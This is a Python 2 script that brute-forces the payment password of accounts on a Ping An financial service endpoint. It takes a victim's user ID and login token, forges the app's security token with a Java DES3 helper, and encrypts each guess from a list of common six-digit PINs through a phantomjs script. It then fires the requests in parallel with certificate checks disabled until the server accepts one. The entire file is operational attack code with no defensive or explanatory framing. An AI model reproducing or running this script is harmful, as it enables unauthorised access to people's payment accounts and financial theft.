#!/usr/bin/env python
# -*- coding: utf-8 -*-
import subprocess
import os
import datetime
import time
import random
import requests
import threadpool
import optparse
import pdb
from requests.packages.urllib3.exceptions import (InsecureRequestWarning,
                                                  InsecurePlatformWarning,
                                                  SNIMissingWarning)

# 不显示警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
requests.packages.urllib3.disable_warnings(SNIMissingWarning)

__VERSION__ = "v1.0"


class PABBrustCrack(object):

    def __init__(self, uId, login_token):
        self.UID = uId
        self.login_token = login_token
        self.proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'https://127.0.0.1:8080'
        }
        self.pub_key1, self.pub_key2 = self.get_public_key()
        self.enc_file = "enc.js"
        self.pass_dict = PABBrustCrack.generate_dic()
        self.thread_pool = threadpool.ThreadPool(5)
        self.success_flag = False
        self.CERT = os.path.join(os.getcwd(), "cacert.cer")

    @staticmethod
    def generate_dic():
        return ["000000", "123456", "666666", "888888", "123321", "123123", "112233", "789789"]

    def generate_enc_paypwd(self, pwd):
        args = ["phantomjs", self.enc_file, pwd, self.get_timestamp(), self.pub_key1, self.pub_key2]
        p = subprocess.Popen(args, stdout=subprocess.PIPE, cwd=os.getcwd())
        key = p.stdout.read().strip()
        return key

    def get_timestamp(self):
        ts = str(int(time.mktime(datetime.datetime.now().timetuple())))
        while len(ts) != 13:
            ts += str(random.randint(0, 9))
        return ts

    def common_para(self):
        para = {
            "timeset": "AcSdPpGZJ09m9Uqmk4VjYxut6oebvc6B/XayJNHdGvWA3rtGL85dLlmfk8Ne+P8TqcInagZ88x8T\nxscoMNs3OLrC4k03ahi/gHTmyp+1BGl+wBhQmDQNlw2W32ftw6vh7pT3TJwz8FQwAvTZU9Ht0LMj\ndn1dusy7YauQ68owSuY=\n",
            "deviceId": "368f2386797247bb056c83850dbab7b02",
            "jsonFlag": "Y",
            "channelType": "02",
            "osType": "02",
            "cv": "170",
            "token": "368f2386797247bb056c83850dbab7b02",
            "uid": self.UID,
            "beta": "0",
            "securityToken": self.generate_stoken(),
            "rsaMobilePhone": "XHUiPmsi0Y7t6l8eJvbrifhl6171BvEBSnAGoQr/+MfhfjAa4YoPcnjKi3ccjgCJcf6fTjCU9GJBmJ5OFcdFt4XX1xh8hiyliDaXFXYRVCpoMYXpaEhlAgqF/jMaqDk6LqYKmddVoa9zU9yoLWu/EW9YdNEoihJyrsXUh627VIY=",
            "osVersion": "4.4.4"
        }
        return para

    def get_public_key(self):
        para = self.common_para()
        url = "https://elis-smp-finance.pingan.com.cn/elis_smp_finance_dmz/do/transation/getPublicKey"
        try:
            req = requests.post(url, data=para, proxies=self.proxies, verify=False)
            # pdb.set_trace()
            k1 = str(req.json()["DATA"]["hsmPublicKey"])
            k2 = str(req.json()["DATA"]["appPublicKey"])
            return k1, k2
        except Exception as e:
            print " + [ERROR] Error occured ->" + str(e)
            exit(-1)

    def __burst(self, pwd):
        enc_pwd = self.generate_enc_paypwd(pwd)
        req_params = self.parse_req_args(enc_pwd)
        self.request(req_params, pwd)

    def start_burst(self):
        thread_req = threadpool.makeRequests(self.__burst, self.pass_dict)
        [self.thread_pool.putRequest(req) for req in thread_req]
        self.thread_pool.wait()

    def request(self, req_params, pwd):
        '''
            POST params and auth result
        '''
        if not self.success_flag:
            print "\033[0;32m[INFO] Cracking - " + pwd + "\033[0m"
            url = "https://elis-smp-finance.pingan.com.cn/elis_smp_finance_dmz/do/mainAccount/checkOldPassword"
            try:
                req = requests.post(url, data=req_params, proxies=self.proxies, verify=False)
                if str(req.json()["CODE"]) == "00":
                    print "\033[0;31m[SUCCESS] payPwd crack success - " + pwd + "\033[0m"
                    self.success_flag = True
            except Exception as e:
                print " + [ERROR] Error occured ->" + str(e)

    def parse_req_args(self, enc_pwd):
        '''
            return HTTP POST params
        '''
        req_args = self.common_para()
        req_args["payPwd"] = enc_pwd
        req_args["pamaAcctPwd"] = "M"

        return req_args

    def generate_stoken(self):
        '''
            return SecuritToken
        '''
        UUID = "df61384b04ca3030885ae6bd3b60ef1b"
        sec_token = UUID + "_" + self.login_token + "_" + self.get_timestamp() + "_" + self.UID
        args = ["java", "-classpath", "classes", "com.jielei.signtest.des3Util", "-e", sec_token]
        p = subprocess.Popen(args, stdout=subprocess.PIPE, cwd=os.getcwd())
        secruity_token = p.stdout.read().strip()
        ret = secruity_token[0:76] + "\n" + secruity_token[76:152] + "\n"
        return ret


if __name__ == "__main__":
    parser = optparse.OptionParser(version=__VERSION__)
    parser.add_option(
        '-l',
        '--login',
        dest='login_token',
        help='loginToken'
    )

    parser.add_option(
        '-u',
        '--uid',
        dest='uid',
        help='uId'
    )

    (options, args) = parser.parse_args()

    if not (options.login_token and options.uid):
        parser.print_help()
        exit(0)

    pb = PABBrustCrack(options.uid, options.login_token)
    pb.start_burst()
